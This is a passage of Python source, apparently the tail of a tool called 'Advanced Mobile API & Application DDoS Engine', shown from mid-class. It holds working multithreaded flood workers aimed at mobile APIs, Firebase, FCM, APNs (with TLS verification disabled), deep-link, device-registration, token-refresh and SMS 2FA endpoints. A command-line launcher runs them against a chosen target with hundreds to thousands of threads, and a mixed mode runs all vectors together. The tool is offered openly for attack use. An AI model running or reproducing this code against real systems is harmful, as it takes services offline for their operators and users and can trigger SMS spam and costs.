                    platform = random.choice([MobilePlatform.ANDROID, MobilePlatform.IOS])
                    method = random.choice(["GET", "POST", "PUT", "DELETE"])
                    path = random.choice(self.request_builder.payload_db.mobile_api_endpoints)
                    
                    body = None
                    if method in ["POST", "PUT"]:
                        body = {
                            "device": self.request_builder.payload_db.generate_device_info(platform),
                            "data": {self.request_builder.payload_db.random_string(8): self.request_builder.payload_db.random_string(20) for _ in range(random.randint(1, 5))}
                        }
                    
                    request = self.request_builder.build_mobile_rest_request(method, path, body, platform)
                    success, rt, status, size = self._send_and_receive(conn, request)
                    
                    if success:
                        self.stats.record_success('mobile_api', platform.value, rt, status)
                        consecutive_errors = 0
                    else:
                        self.stats.record_failure('mobile_api', 'network_error', platform.value)
                        consecutive_errors += 1
                        break
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('mobile_api', type(e).__name__)
                time.sleep(random.uniform(0.01, 0.1 * config.jitter))
    
    def _firebase_flood_worker(self, thread_id):
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                path = random.choice(self.request_builder.payload_db.firebase_paths)
                path = path.replace("{userId}", self.request_builder.payload_db.random_string(8))
                path = path.replace("{postId}", self.request_builder.payload_db.random_string(8))
                path = path.replace("{chatId}", self.request_builder.payload_db.random_string(8))
                
                method = random.choice(["GET", "PUT", "PATCH", "POST"])
                data = None
                
                if method in ["PUT", "PATCH", "POST"]:
                    data = {
                        self.request_builder.payload_db.random_string(8): self.request_builder.payload_db.random_string(50),
                        "timestamp": {".sv": "timestamp"},
                        "device": self.request_builder.payload_db.generate_device_info(MobilePlatform.ANDROID)
                    }
                
                path = f"{path}.json"
                request = self.request_builder.build_firebase_request(path, method, data)
                success, rt, status, size = self._send_and_receive(conn, request)
                
                if success:
                    self.stats.record_success('firebase', 'android', rt, status)
                    consecutive_errors = 0
                else:
                    self.stats.record_failure('firebase', 'network_error', 'android')
                    consecutive_errors += 1
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('firebase', type(e).__name__)
                time.sleep(0.01)
    
    def _fcm_flood_worker(self, thread_id):
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                request = self.request_builder.build_fcm_request()
                success, rt, status, size = self._send_and_receive(conn, request)
                
                if success:
                    self.stats.record_success('fcm', 'android', rt, status)
                    consecutive_errors = 0
                else:
                    self.stats.record_failure('fcm', 'network_error', 'android')
                    consecutive_errors += 1
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('fcm', type(e).__name__)
                time.sleep(0.01)
    
    def _apns_flood_worker(self, thread_id):
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                conn.settimeout(10)
                conn.connect((self.target, 2195))  # APNs default port
                
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                conn = context.wrap_socket(conn, server_hostname=self.target)
                
                request = self.request_builder.build_apns_request()
                conn.send(request)
                
                try:
                    response = conn.recv(4096)
                    self.stats.record_success('apns', 'ios')
                    consecutive_errors = 0
                except:
                    self.stats.record_success('apns', 'ios')
                
                conn.close()
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('apns', type(e).__name__, 'ios')
                time.sleep(0.01)
    
    def _deep_link_flood_worker(self, thread_id):
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                request = self.request_builder.build_deep_link_request()
                success, rt, status, size = self._send_and_receive(conn, request)
                
                if success:
                    platform = random.choice(['android', 'ios'])
                    self.stats.record_success('deep_link', platform, rt, status)
                    consecutive_errors = 0
                else:
                    self.stats.record_failure('deep_link', 'network_error')
                    consecutive_errors += 1
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('deep_link', type(e).__name__)
                time.sleep(0.01)
    
    def _device_registration_flood_worker(self, thread_id):
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                request = self.request_builder.build_device_registration_request()
                success, rt, status, size = self._send_and_receive(conn, request)
                
                if success:
                    platform = random.choice(['android', 'ios'])
                    self.stats.record_success('device_reg', platform, rt, status)
                    consecutive_errors = 0
                else:
                    self.stats.record_failure('device_reg', 'network_error')
                    consecutive_errors += 1
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('device_reg', type(e).__name__)
                time.sleep(0.01)
    
    def _auth_refresh_flood_worker(self, thread_id):
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                request = self.request_builder.build_auth_refresh_request()
                success, rt, status, size = self._send_and_receive(conn, request)
                
                if success:
                    self.stats.record_success('auth_refresh', None, rt, status)
                    consecutive_errors = 0
                else:
                    self.stats.record_failure('auth_refresh', 'network_error')
                    consecutive_errors += 1
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('auth_refresh', type(e).__name__)
                time.sleep(0.01)
    
    def _sms_2fa_flood_worker(self, thread_id):
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                request = self.request_builder.build_sms_2fa_request()
                success, rt, status, size = self._send_and_receive(conn, request)
                
                if success:
                    self.stats.record_success('sms_2fa', None, rt, status)
                    consecutive_errors = 0
                else:
                    self.stats.record_failure('sms_2fa', 'network_error')
                    consecutive_errors += 1
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('sms_2fa', type(e).__name__)
                time.sleep(0.01)
    
    def _push_subscription_flood_worker(self, thread_id):
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                platform = random.choice([MobilePlatform.ANDROID, MobilePlatform.IOS])
                body = {
                    "platform": platform.value,
                    "push_token": random.choice(
                        self.request_builder.payload_db.fcm_tokens if platform == MobilePlatform.ANDROID
                        else self.request_builder.payload_db.apns_device_tokens
                    ),
                    "topics": [self.request_builder.payload_db.random_string(10) for _ in range(random.randint(1, 10))],
                    "device_info": self.request_builder.payload_db.generate_device_info(platform)
                }
                
                request = self.request_builder.build_mobile_rest_request(
                    "POST", "/api/v1/push/subscribe", body, platform
                )
                success, rt, status, size = self._send_and_receive(conn, request)
                
                if success:
                    self.stats.record_success('push_sub', platform.value, rt, status)
                    consecutive_errors = 0
                else:
                    self.stats.record_failure('push_sub', 'network_error')
                    consecutive_errors += 1
                
                self.connection_pool.return_connection(conn)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('push_sub', type(e).__name__)
                time.sleep(0.01)
    
    def _stats_reporter(self):
        while self.running:
            stats = self.stats.get_summary()
            
            sys.stdout.write(
                f"\r[+] {datetime.now().strftime('%H:%M:%S')} | "
                f"Time: {stats['elapsed']:.0f}s | "
                f"Requests: {stats['total_requests']} | "
                f"Rate: {stats['rate']:.0f}/s | "
                f"Success: {stats['successful']} | "
                f"Failed: {stats['failed']} | "
                f"Avg RT: {stats['avg_response_time']*1000:.1f}ms | "
                f"Platforms: {dict(stats['platform_stats'])}   "
            )
            sys.stdout.flush()
            time.sleep(0.5)
    
    def launch(self, vector):
        if not self._test_target():
            logger.error("[-] Attack aborted - target unreachable")
            return
        
        logger.info(f"[!] Starting {vector.value} mobile attack")
        logger.info(f"[!] Target: {self.target}:{self.port} | Threads: {self.threads} | Duration: {self.duration}s")
        
        reporter = threading.Thread(target=self._stats_reporter, daemon=True)
        reporter.start()
        
        workers = {
            MobileAttackVector.MOBILE_API_FLOOD: self._mobile_api_flood_worker,
            MobileAttackVector.FIREBASE_FLOOD: self._firebase_flood_worker,
            MobileAttackVector.FCM_FLOOD: self._fcm_flood_worker,
            MobileAttackVector.APNS_FLOOD: self._apns_flood_worker,
            MobileAttackVector.DEEP_LINK_FLOOD: self._deep_link_flood_worker,
            MobileAttackVector.DEVICE_REGISTRATION_FLOOD: self._device_registration_flood_worker,
            MobileAttackVector.AUTH_REFRESH_FLOOD: self._auth_refresh_flood_worker,
            MobileAttackVector.SMS_2FA_FLOOD: self._sms_2fa_flood_worker,
            MobileAttackVector.PUSH_SUBSCRIPTION_FLOOD: self._push_subscription_flood_worker,
            MobileAttackVector.JWT_REFRESH_FLOOD: self._auth_refresh_flood_worker,
            MobileAttackVector.MOBILE_REST_FLOOD: self._mobile_api_flood_worker,
            MobileAttackVector.MOBILE_GRAPHQL_FLOOD: self._mobile_api_flood_worker,
        }
        
        worker_func = workers.get(vector)
        if not worker_func:
            logger.error(f"[-] Unknown vector: {vector}")
            return
        
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=worker_func, args=(i,), daemon=True)
            t.start()
            threads.append(t)
        
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            logger.info("\n[!] Interrupted by user")
        finally:
            self.running = False
        
        for t in threads:
            t.join(timeout=2)
        
        self.connection_pool.close_all()
        
        stats = self.stats.get_summary()
        logger.info("\n[!] Mobile Attack Complete")
        logger.info(f"    Duration: {stats['elapsed']:.2f}s")
        logger.info(f"    Total Requests: {stats['total_requests']}")
        logger.info(f"    Successful: {stats['successful']}")
        logger.info(f"    Failed: {stats['failed']}")
        logger.info(f"    Average Rate: {stats['rate']:.0f} req/s")
        logger.info(f"    Avg Response Time: {stats['avg_response_time']*1000:.1f}ms")
        logger.info(f"    Platform Stats: {stats['platform_stats']}")
        
        if stats['http_codes']:
            logger.info(f"    HTTP Status Codes: {stats['http_codes']}")

# ==================== MAIN CONTROLLER ====================
def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Advanced Mobile API & Application DDoS Engine v4.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Mobile Attack Vectors:
  mobile_api_flood         - Generic mobile API endpoint flood
  firebase_flood           - Firebase Realtime Database/Storage flood
  fcm_flood                - Firebase Cloud Messaging flood
  apns_flood               - Apple Push Notification Service flood
  deep_link_flood          - Deep link resolution flood
  device_registration_flood- Device registration endpoint flood
  auth_refresh_flood       - OAuth/JWT token refresh flood
  jwt_refresh_flood        - JWT refresh token loop
  sms_2fa_flood            - SMS 2FA triggering flood
  push_subscription_flood  - Push notification subscription flood
  mobile_rest_flood        - REST API flood with mobile headers
  mobile_graphql_flood     - GraphQL flood for mobile backends
  mixed_mobile             - All mobile vectors combined

Examples:
  python3 mobile_ddos.py api.example.com -p 443 -s -v firebase_flood -t 1000 -d 120
  python3 mobile_ddos.py mobile-api.target.com -v mobile_api_flood -t 500
  python3 mobile_ddos.py 192.168.1.100 -p 8080 -v deep_link_flood -t 800
  python3 mobile_ddos.py target.com -v mixed_mobile -t 2000 -d 300
        """
    )
    
    parser.add_argument('target', help='Target hostname or IP')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-t', '--threads', type=int, default=500, help='Number of threads (default: 500)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Duration in seconds (default: 60)')
    parser.add_argument('-s', '--ssl', action='store_true', help='Use HTTPS/SSL')
    parser.add_argument('-v', '--vector', default='mobile_api_flood', help='Attack vector (default: mobile_api_flood)')
    parser.add_argument('--fcm-key', help='FCM server key for push notification flood')
    parser.add_argument('--debug', action='store_true', help='Enable debug logging')
    
    args = parser.parse_args()
    
    if args.debug:
        config.debug = True
        logger.setLevel(logging.DEBUG)
    
    if args.fcm_key:
        config.fcm_server_key = args.fcm_key
    
    try:
        ipaddress.ip_address(args.target)
        target = args.target
    except ValueError:
        try:
            target = socket.gethostbyname(args.target)
            logger.info(f"[+] Resolved {args.target} to {target}")
        except socket.gaierror:
            logger.error(f"[-] Cannot resolve: {args.target}")
            sys.exit(1)
    
    vector_map = {v.value: v for v in MobileAttackVector}
    vector = vector_map.get(args.vector.lower())
    
    if not vector:
        logger.error(f"[-] Unknown vector: {args.vector}")
        logger.info(f"Available vectors: {', '.join(v.value for v in MobileAttackVector)}")
        sys.exit(1)
    
    use_ssl = args.ssl or args.port == 443
    
    if vector == MobileAttackVector.MIXED_MOBILE:
        vectors = [
            MobileAttackVector.MOBILE_API_FLOOD,
            MobileAttackVector.FIREBASE_FLOOD,
            MobileAttackVector.FCM_FLOOD,
            MobileAttackVector.DEEP_LINK_FLOOD,
            MobileAttackVector.DEVICE_REGISTRATION_FLOOD,
            MobileAttackVector.AUTH_REFRESH_FLOOD,
            MobileAttackVector.SMS_2FA_FLOOD,
            MobileAttackVector.PUSH_SUBSCRIPTION_FLOOD
        ]
        
        threads_per = max(1, args.threads // len(vectors))
        executors = []
        
        for v in vectors:
            executor = MobileAttackExecutor(target, args.port, use_ssl, threads_per, args.duration)
            thread = threading.Thread(target=executor.launch, args=(v,), daemon=True)
            thread.start()
            executors.append((executor, thread))
        
        try:
            time.sleep(args.duration)
        except KeyboardInterrupt:
            logger.info("\n[!] Interrupted")
        
        for executor, _ in executors:
            executor.running = False
        
        logger.info("[!] Mixed mobile attack completed")
    else:
        executor = MobileAttackExecutor(target, args.port, use_ssl, args.threads, args.duration)
        executor.launch(vector)

if __name__ == "__main__":
    main()